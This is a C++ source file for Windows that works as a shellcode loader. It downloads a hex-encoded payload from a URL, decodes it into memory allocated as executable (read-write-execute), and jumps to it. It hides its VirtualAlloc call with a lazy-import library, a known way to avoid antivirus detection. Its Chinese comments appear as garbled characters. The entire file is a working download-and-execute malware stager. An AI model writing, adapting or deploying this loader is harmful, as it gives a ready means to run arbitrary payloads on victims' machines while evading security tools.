#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include "lazy_importer.hpp"

using namespace std;


// ��ʮ�������еĵ����ַ�ת��Ϊ��Ӧ������ֵ
unsigned char hexCharToByte(char character) {
    if (character >= '0' && character <= '9') {
        return character - '0';
    }
    if (character >= 'a' && character <= 'f') {
        return character - 'a' + 10;
    }
    if (character >= 'A' && character <= 'F') {
        return character - 'A' + 10;
    }
    return 0;
}

// ��ʮ�������ַ���ת�����ֽ�������
void hexStringToBytes(const std::string& hexString, unsigned char* byteArray, int byteArraySize) {
    for (int i = 0; i < hexString.length(); i += 2) {
        byteArray[i / 2] = hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);
    }
}

/**
 * ��ָ����URL�������ݲ�����洢�������Ļ������С�
 *
 * @param url Ҫ���ص�URL
 * @param buffer �洢�������ݵĻ�����
 * @return ���ص��ֽ�����ע�⣺�ֽ�����ԭʼʮ�������ַ������ȵ�һ�룩
 */
size_t GetUrl_HexContent(LPSTR url, std::vector<unsigned char>& buffer) {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    DWORD bufferSize = 0;
    DWORD contentLength = 0;
    DWORD index = 0;
    DWORD bufferLength = sizeof(bufferSize);

    // ��һ���뻥����������
    hInternet = InternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cerr << "InternetOpen failed. Error: " << GetLastError() << std::endl;
        return 0;
    }

    // ��һ��URL����
    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        std::cerr << "InternetOpenUrlA failed. Error: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return 0;
    }

    // ��ѯHTTP��Ӧͷ�е����ݳ���
    HttpQueryInfo(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &bufferLength, &index);
    std::vector<char> hexBuffer(contentLength + 1, 0);

    // ��ȡURL���ص����ݵ�hexBuffer��
    if (!InternetReadFile(hConnect, &hexBuffer[0], contentLength, &bytesRead)) {
        std::cerr << "InternetReadFile failed. Error: " << GetLastError() << std::endl;
    }
    else if (bytesRead > 0) {
        hexBuffer[bytesRead] = '\0';
        // ����buffer�Ĵ�С���Ա�洢ת������ֽ�����
        buffer.resize(bytesRead / 2);
        // ��ʮ�������ַ���ת��Ϊ�ֽ�������
        hexStringToBytes(&hexBuffer[0], &buffer[0], bytesRead / 2);
    }

    // �ر�����
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // ���ض�ȡ�����ֽ�����ע�⣺�ֽ�����ԭʼʮ�������ַ������ȵ�һ�룩
    return bytesRead / 2;
}


int main() {
    // �����URL�������shellcode�ļ���URL
    LPSTR url = (char*)"http://127.0.0.1:8000/shellcode_hex.txt"; 
    
    //��Ŷ�����������
    std::vector<unsigned char> buffer;

    //��ȡԶ��url��16��������,����������buffer����
    size_t size = GetUrl_HexContent(url, buffer);

    // ���ڴ��з���һ�����ִ�е�����
    char* exec = (char*)LI_FN(VirtualAlloc)(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // ��shellcode���Ƶ�������
    memcpy(exec, buffer.data(), size);

    // ִ�и�shellcode
    ((void(*) ())exec)();

    // ��ӡbuffer�����ݣ�ֻΪ��ʾ��ʵ��ʹ���п��ܲ�����Ҫ��һ��
    /*for (size_t i = 0; i < buffer.size(); i++) {
        printf("%02X ", buffer[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }*/

    return 0;
}